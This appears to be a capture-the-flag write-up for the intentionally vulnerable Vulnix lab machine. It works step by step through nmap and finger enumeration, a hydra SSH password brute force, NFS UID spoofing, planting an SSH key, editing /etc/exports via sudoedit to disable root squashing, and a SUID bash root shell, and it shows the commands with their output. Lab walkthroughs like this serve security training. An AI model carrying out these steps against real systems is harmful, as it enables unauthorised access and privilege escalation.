# VULNIX


### NMAP

kali@kali:~$ nmap 192.168.1.100 -sV -sT -A

>Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-10 13:44 CET  
>Nmap scan report for vulnix.home (192.168.1.100)  
>Host is up (0.00055s latency).  
>Not shown: 988 closed ports  
>PORT     STATE SERVICE    VERSION  
>22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)  
>| ssh-hostkey:   
>|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)  
>|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)  
>|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)  
>25/tcp   open  smtp       Postfix smtpd  
>|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,   
>| ssl-cert: Subject: commonName=vulnix  
>| Not valid before: 2012-09-02T17:40:12  
>|_Not valid after:  2022-08-31T17:40:12  
>|_ssl-date: 2018-03-10T12:45:36+00:00; +1s from scanner time.  
>79/tcp   open  finger     Linux fingerd  
>|_finger: No one logged on.\x0D  
>110/tcp  open  pop3       Dovecot pop3d  
>|_pop3-capabilities: PIPELINING CAPA UIDL SASL STLS TOP RESP-CODES  
>| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server  
>| Not valid before: 2012-09-02T17:40:22  
>|_Not valid after:  2022-09-02T17:40:22  
>|_ssl-date: 2018-03-10T12:45:36+00:00; 0s from scanner time.  
>111/tcp  open  rpcbind    2-4 (RPC #100000)  
>| rpcinfo:   
>|   program version   port/proto  service  
>|   100000  2,3          111/tcp  rpcbind  
>|   100000  2,3,4        111/udp  rpcbind  
>|   100003  2,3,4       2049/tcp  nfs  
>|   100003  2,3,4       2049/udp  nfs  
>|   100005  1,2,3      53683/udp  mountd  
>|   100005  1,2,3      59616/tcp  mountd  
>|   100021  1,3,4      36103/udp  nlockmgr  
>|   100021  1,3,4      45994/tcp  nlockmgr  
>|   100024  1          36141/udp  status  
>|   100024  1          53348/tcp  status  
>|   100227  2,3         2049/tcp  nfs_acl  
>|_  100227  2,3         2049/udp  nfs_acl  
>143/tcp  open  imap       Dovecot imapd  
>|_imap-capabilities: OK LOGINDISABLEDA0001 ENABLE IDLE SASL-IR LOGIN-REFERRALS post-login have Pre-login more IMAP4rev1 capabilities STARTTLS LITERAL+ listed ID  
>| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server  
>| Not valid before: 2012-09-02T17:40:22  
>|_Not valid after:  2022-09-02T17:40:22  
>|_ssl-date: 2018-03-10T12:45:36+00:00; +1s from scanner time.  
>512/tcp  open  exec?  
>513/tcp  open  login      OpenBSD or Solaris rlogind  
>514/tcp  open  tcpwrapped  
>993/tcp  open  ssl/imap   Dovecot imapd  
>|_imap-capabilities: OK ENABLE IDLE SASL-IR LOGIN-REFERRALS post-login have Pre-login more IMAP4rev1 capabilities listed LITERAL+ AUTH=PLAINA0001 ID  
>| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server  
>| Not valid before: 2012-09-02T17:40:22  
>|_Not valid after:  2022-09-02T17:40:22  
>|_ssl-date: 2018-03-10T12:45:35+00:00; 0s from scanner time.  
>995/tcp  open  ssl/pop3   Dovecot pop3d  
>|_pop3-capabilities: PIPELINING CAPA UIDL SASL(PLAIN) USER TOP RESP-CODES  
>| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server  
>| Not valid before: 2012-09-02T17:40:22  
>|_Not valid after:  2022-09-02T17:40:22  
>|_ssl-date: 2018-03-10T12:45:35+00:00; 0s from scanner time.  
>2049/tcp open  nfs_acl    2-3 (RPC #100227)  
>Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel


### FINGER

kali@kali:~$ finger root@192.168.1.100
>Login: root           			Name: root  
>Directory: /root                    	Shell: /bin/bash  
>Never logged in.  
>No mail.  
>No Plan.

kali@kali:~$ finger vulnix@192.168.1.100
>Login: vulnix         			Name:   
>Directory: /home/vulnix             	Shell: /bin/bash  
>Never logged in.  
>No mail.  
>No Plan.

root@kali:/home# finger user@192.168.1.100
>Login: user           			Name: user  
>Directory: /home/user               	Shell: /bin/bash  
>Never logged in.  
>No mail.  
>No Plan.  
>
>Login: dovenull       			Name: Dovecot login user  
>Directory: /nonexistent             	Shell: /bin/false  
>Never logged in.  
>No mail.  
>No Plan.


### NFS

root@kali:/home/kali# showmount -e 192.168.1.100
>Export list for 192.168.1.100:
>/home/vulnix *

root@kali:/home/kali# mount --source 192.168.1.100:/home/vulnix --target /home/vulnix

**Permission denied T.T'**


### BRUTEFORCE

kali@kali:~$ hydra -l user -P rockyou.txt 192.168.1.100 ssh -t 4
>Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.  
>Hydra (http://www.thc.org/thc-hydra) starting at 2018-03-10 15:38:39  
>[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task  
>[DATA] attacking ssh://192.168.1.100:22/  
>[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 4 active  
>[STATUS] 60.67 tries/min, 182 tries in 00:03h, 14344217 to do in 3940:44h, 4 active  
>[STATUS] 60.57 tries/min, 424 tries in 00:07h, 14343975 to do in 3946:51h, 4 active  
>[22][ssh] host: 192.168.1.100   login: user   password: letmein  
>1 of 1 target successfully completed, 1 valid password found  
>Hydra (http://www.thc.org/thc-hydra) finished at 2018-03-10 15:47:27

kali@kali:~$ root -l user 192.168.1.100
>user@vulnix:~$ id  
>uid=1000(user) gid=1000(user) groups=1000(user),100(users)

user@vulnix:~$ cat /etc/passwd
>root: x:0:0:root:/root:/bin/bash  
>vulnix: x:2008:2008::/home/vulnix:/bin/bash


### ACCESS TO NFS

root@kali:/home/kali# groupadd vulnix -g 2008

root@kali:/home/kali# useradd vulnix -u 2008 -g 2008 -s /bin/bash

root@kali:/home/kali# mkdir /home/vulnix

root@kali:/home/kali# mount --source 192.168.1.100:/home/vulnix --target /home/vulnix

root@kali:/home/kali# su vulnix

vulnix@kali:/home/kali$ cd /home/vulnix

vulnix@kali:~$ ll>  
>total 20>  
>drwxr-x--- 2 vulnix vulnix 4096 Sep  2  2012 ./>  
>drwxr-xr-x 4 root   root   4096 Mar 10 16:04 ../>  
>-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout>  
>-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc>  
>-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile



### GETTING SSH WITH VULNIX

kali@kali:~$ ssh-keygen -t rsa

kali@kali:~$ cat .ssh/id_rsa.pub 

>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDT1Mw6+iVZcmCHOe9IBW7S5He5ZeBwTFNhNlNqZQ90S2GLlenYEJElGxS2LiZcjtaTi4DkeYSZlUOI+fXKb+iLLFXyHdkh53gqSwF/sD0rV8N+6HQB93XtwWf69SUm80Dw9rYTOkDhPzHhQFsUIXyErZeiX0vdcDsXEKUV+toYOmmUa/avVbz/Y9CjMTAAFxEDSzprbLAIORJ6ZjIeVn5J4xHo1+xuD3O0tQ/Jw7fhc7zTn3NGtd0JjDuRiz9T6X+eYLL6+rwMXnQXKxhGNbuBIObNHR/iNL1YZdSxH6W8gSFiHIGr42hSUV1dxEySDz8bNCZFI2etWyqbpTmfJGCP kali@kali

kali@kali:~$ su vulnix

vulnix@kali:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDT1Mw6+iVZcmCHOe9IBW7S5He5ZeBwTFNhNlNqZQ90S2GLlenYEJElGxS2LiZcjtaTi4DkeYSZlUOI+fXKb+iLLFXyHdkh53gqSwF/sD0rV8N+6HQB93XtwWf69SUm80Dw9rYTOkDhPzHhQFsUIXyErZeiX0vdcDsXEKUV+toYOmmUa/avVbz/Y9CjMTAAFxEDSzprbLAIORJ6ZjIeVn5J4xHo1+xuD3O0tQ/Jw7fhc7zTn3NGtd0JjDuRiz9T6X+eYLL6+rwMXnQXKxhGNbuBIObNHR/iNL1YZdSxH6W8gSFiHIGr42hSUV1dxEySDz8bNCZFI2etWyqbpTmfJGCP kali@kali" > authorized_keys

kali@kali:~$ ssh -l vulnix 192.168.1.100


### PRIVILEGE ELEVATION

vulnix@vulnix:~$ sudo -l

>Matching 'Defaults' entries for vulnix on this host:  
>    env_reset,  
>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
>
>User vulnix may run the following commands on this host:  
>    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports

vulnix@vulnix:~$ sudoedit /etc/exports

>/home/vulnix    *(rw,root_squash)  
>/root   *(rw,no_root_squash) <- ADDED

**Reboot!**

root@kali:/home/kali# showmount -e 192.168.1.100

>Export list for 192.168.1.100:  
>/root        *  
>/home/vulnix *

root@kali:/mnt# mount 192.168.1.100:/root /mnt/root

root@kali:/mnt# cd /mnt/root

root@kali:/mnt/root# ls -lrth

>total 4.0K  
>-r-------- 1 root root 33 Sep  2  2012 trophy.txt

root@kali:/mnt/root# cat trophy.txt 

>***cc614640424f5bd60ce5d5264899c3be***


### GETTING ROOT SHELL

vulnix@vulnix:~$ sudoedit /etc/exports

>/home/vulnix    *(rw,no_root_squash) <- MODIFIED  
>/root   *(rw,no_root_squash)

**Reboot!**

vulnix@vulnix:~$ cp /bin/bash /home/vulnix

root@kali:/mnt/vulnix# chmod 4777 bash 

root@kali:/mnt/vulnix# ls -lrth
>total 900K  
>-rwsrwxrwx 1 root root 900K Mar 10 16:47 bash

vulnix@vulnix:~$ ./bash -p

bash-4.2# id

>uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)
